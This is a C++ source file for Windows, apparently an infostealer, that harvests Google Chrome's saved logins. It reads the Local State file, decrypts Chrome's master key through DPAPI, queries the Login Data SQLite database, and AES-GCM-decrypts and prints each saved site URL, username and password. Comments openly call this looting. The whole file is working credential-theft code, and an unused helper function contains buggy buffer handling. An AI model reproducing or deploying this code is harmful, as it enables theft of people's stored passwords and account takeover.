#include "aes_gcm.h"
#include "sqlite3.h"

#include <vector>
#include <string>
#include <windows.h>
#include <tchar.h>

//Get Local State
BYTE* getLocalState(){
    HANDLE hStateFile;
    DWORD LSFileSize;

    char* cLocalStatePath = (char*) malloc(1024);
    if (cLocalStatePath == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    // Building Path to Chrome Login Data
    sprintf(
        cLocalStatePath,
        "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
        getenv("USERPROFILE")
    );

    //Get Local State File Handle
    hStateFile = CreateFileA(
        cLocalStatePath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hStateFile == INVALID_HANDLE_VALUE) {
        printf("Couldn't open Local State File %s\n", GetLastError());
    }

    //Get File Size
    LSFileSize = GetFileSize(hStateFile, NULL);
    if (LSFileSize == INVALID_FILE_SIZE){
        printf("Couldn't get file size with error: %s\n", GetLastError());
    };

    LPVOID fileContents = malloc(LSFileSize);
    if(!ReadFile(
        hStateFile,
        fileContents,
        LSFileSize,
        NULL,
        NULL
    )){
        printf("Critical error\n");
    }

    CloseHandle(hStateFile);
    return (BYTE*)fileContents; //Don't forget to free later
}

// Decrypt DPAPI
DATA_BLOB decryptDPAPI(BYTE* encryptedBytes, DWORD encryptBytesSize) {
    DATA_BLOB in;
    DATA_BLOB entropy;
    DATA_BLOB out;
    BYTE* entropyBuffer = (BYTE*) malloc (0);
    if (entropyBuffer == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    BYTE* outBuffer = (BYTE*)malloc(encryptBytesSize);
    //Setting DATA_BLOBS
    in.pbData = encryptedBytes;
    in.cbData = encryptBytesSize;
    entropy.pbData = entropyBuffer;
    entropy.cbData = (DWORD)0;
    out.cbData = encryptBytesSize;
    out.pbData = outBuffer;
    
    //DECRYPTING TIME!!!!
    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)){
        return out;
    }
    else{
        printf("Decryption didn't work. ERROR %d", GetLastError());
        free(entropyBuffer);
        free(outBuffer);
        return out;
    }
}

//Get Encrpytion Key
DATA_BLOB getEncryptKey(){
    BYTE* localState = getLocalState();
    
    char* osCryptstr = (char*) malloc (1024);
    if (osCryptstr == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    // Parsing Strings
    char* token = strtok((char*)localState, ",");
    while (token != NULL) {
        if (strncmp(token, "\"os_crypt\"", strlen("\"os_crypt\"")) == 0){
            osCryptstr = token;
        }
        token = strtok(NULL, ",");
    }
    char* encryptKey = strtok(osCryptstr, "\"{}:");
    while (encryptKey != NULL) {
        if (strncmp(encryptKey, "os_crypt", strlen("os_crypt")) == 0 || strncmp(encryptKey, "encrypted_key", strlen("encrypted_key")) == 0) {
            encryptKey = strtok(NULL, "\"{}:");
        }
        else {
            token = encryptKey;
            encryptKey = strtok(NULL, "\"{}:");
        }
    }
    free(localState);


    DWORD keySize = strlen(token);
    DWORD bufSize = 0;
    // First Call to get length
    BOOL firstDecode = CryptStringToBinaryA(token, keySize, CRYPT_STRING_BASE64, NULL, &bufSize, NULL, NULL);
    if (firstDecode == 0){
        printf("Trouble 1Decoding\n");
    };

    //Decoding
    BYTE* buffer = (BYTE*)malloc(keySize);
    if(buffer == NULL){
        printf("Memory not successfully allocated.\n");
    };
    BOOL decoded = CryptStringToBinaryA(token, keySize, CRYPT_STRING_BASE64, buffer, &bufSize, NULL, NULL);
    if (decoded == 0) {
        printf("Trouble Decoding\n");
    };
    

    BYTE* finalKey = (BYTE*) malloc (bufSize-5);
    if (finalKey == NULL) {
        printf("Memory not successfully allocated.\n");
    };
    for(int i = 5; i < bufSize; i++){
        finalKey[i-5] = buffer[i];
    }
    free(buffer);
    
    DATA_BLOB masterKey = decryptDPAPI(finalKey, bufSize-5);
    return masterKey;
}

char* AESDecrypt(char* pass, BYTE* masterKey){
    if(strlen(pass) > 31){
        auto aes = new AESGCM(masterKey);

        std::string password(pass);

        std::string iv(password.substr(3, 12));
        std::string cipher(password.substr(15, password.size()-31));
        std::string tag(password.substr(password.size()-16));

        aes->Decrypt((BYTE*)iv.c_str(), iv.size(), (BYTE*)cipher.c_str(), cipher.size(), (BYTE*)tag.c_str(), tag.size());
        aes->plaintext[cipher.size()] = '\0';
        return (char*)aes->plaintext;
    }else{
        return const_cast<char*>("");
    }
}

// Decrypt Looted Chrome Passwords
char* Crack(char* pass, BYTE* encKey) {
    DATA_BLOB in;
    DATA_BLOB out;
    DATA_BLOB blobEntropy;
    DWORD passSize = strlen(pass);

    char* decryptedPass = (char*) malloc(2048);
    if(decryptedPass == NULL) {
        printf("Memory not successfully Allocated.\n");
    }

    BYTE* iv = (BYTE*) malloc (14); 
    if(iv == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    for (int i = 3; i <= 15; i++){
        iv[i-3] = pass[i];
    }

    BYTE* cipherText = (BYTE*) malloc (passSize - 16);
    if(cipherText == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    for (int i = 15; i <= passSize; i++){
        cipherText[i-15] = pass[i];
    }

    DWORD ptBufferSize = 0;
    
    NTSTATUS nStatus = BCryptDecrypt(
        encKey, 
        cipherText, passSize-16, 
        NULL, 
        iv, 14,
        NULL, 0, 
        &ptBufferSize, 0);

    printf("First Error %d", GetLastError());
    if(NT_SUCCESS(nStatus)){ 
        BYTE* plaintext = (BYTE*) malloc (sizeof (BYTE) * (ptBufferSize+1));
        if(plaintext == NULL) {
            printf("Memory not successfully Allocated.\n");
        }
        DWORD dwBytesDone = 0;
        nStatus = BCryptDecrypt(
            encKey, 
            cipherText, passSize-16, 
            NULL, 
            iv, 14, 
            plaintext, ptBufferSize, 
            &dwBytesDone, 0);
        return (char*) plaintext;
    };

    free(decryptedPass);
    printf("Error %d", GetLastError());
    return (char*) "Error";
}

//Loot Chrome Passwords
wchar_t* GetPass(DATA_BLOB masterKey){
    char* cPassPath = (char*) malloc(512);
    if (cPassPath == NULL) {
        printf("Memory not successfully Allocated.\n");
    }
    // Building Path to Chrome Login Data
    sprintf(
        cPassPath,
        "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        getenv("USERPROFILE")
    );

// THE REAL DEAL
    sqlite3_stmt* stmt;
    sqlite3* db;

    char *query = (char*) "SELECT origin_url, username_value, password_value FROM logins";
    if (sqlite3_open(cPassPath, &db) == SQLITE_OK) {
        if (sqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK) {
            //Begin Data Reading
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                //While we still have data in database
                char *url = (char*)sqlite3_column_text(stmt,0);
                char* username = (char*) sqlite3_column_text(stmt,1);
                char* password = (char*)sqlite3_column_text(stmt,2); //This is the only encrypted field
                DWORD passSize = sqlite3_column_bytes(stmt, 2);
                printf("Url: %s\n",url);
                if(username == NULL){
                    printf("Username: ");
                }
                else{
                printf("Username: %s\n",username);
                }
                
                char* decrypted =  AESDecrypt(password, masterKey.pbData);
                if (decrypted != NULL){
                    printf("Password: %s\n\n", decrypted);
                }
            }
        }
        else{
            printf("Error preparing database with error %d\n", (sqlite3_prepare_v2(db, query, -1, &stmt, 0)));
        }
        sqlite3_finalize(stmt);
        sqlite3_close(db);
    }
    else {
        printf("Error opening database!\n");
    }

    free(cPassPath);
    return NULL;
}


int _tmain(int argc, _TCHAR *argv[]){
    DATA_BLOB encKey = getEncryptKey();
    GetPass(encKey);
}